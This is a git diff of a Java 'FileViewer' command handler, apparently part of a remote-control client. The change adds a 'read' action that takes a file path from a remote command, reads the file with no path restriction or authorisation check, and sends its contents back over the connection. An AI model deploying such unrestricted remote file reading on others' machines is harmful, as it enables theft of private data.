@@ -10,15 +10,16 @@ import java.nio.file.Paths;
 import java.util.HashMap;
 
 public class FileViewer extends Instruction {
-    private String path;
+    public static String type = "fileview";
 
-    public FileViewer(Connection connection, String path) {
-        super(connection, "fileview", new String[]{});
-
-        this.path = path;
+    public FileViewer(Connection connection) {
+        super(connection, type);
     }
 
-    public void execute(String todo, String from) throws IOException {
+    public void execute(HashMap<String, Object> arguments, String from) throws IOException {
+        String todo = (String) arguments.get("todo");
+        String path = (String) arguments.get("path");
+
         if (todo.equals("list")) {
             HashMap<String, Integer> list = listFiles(path);
 
@@ -27,6 +28,17 @@ public class FileViewer extends Instruction {
             HashMap<String, String> toSend = new HashMap<String, String>();
             toSend.put("type", "reply");
             toSend.put("value", jsonList);
+            toSend.put("to", from);
+
+            String finishedString = json.toJson(toSend);
+
+            connection.send(finishedString);
+        } else if (todo.equals("read")) {
+            String data = readFile(path);
+
+            HashMap<String, String> toSend = new HashMap<String, String>();
+            toSend.put("type", "reply");
+            toSend.put("value", data);
             toSend.put("to", from);
 
             String finishedString = json.toJson(toSend);
@@ -48,10 +60,14 @@ public class FileViewer extends Instruction {
         return list;
     }
 
-    private void readFile(String path) throws IOException {
-        String content = new String(Files.readAllBytes(Paths.get(path)));
+    private String readFile(String path) throws IOException {
+        try {
+            String content = new String(Files.readAllBytes(Paths.get(path)));
 
-        System.out.println(content);
+            return content;
+        } catch (IOException e) {
+            return e.toString();
+        }
     }
 
     private void getFileInfo(String path) {
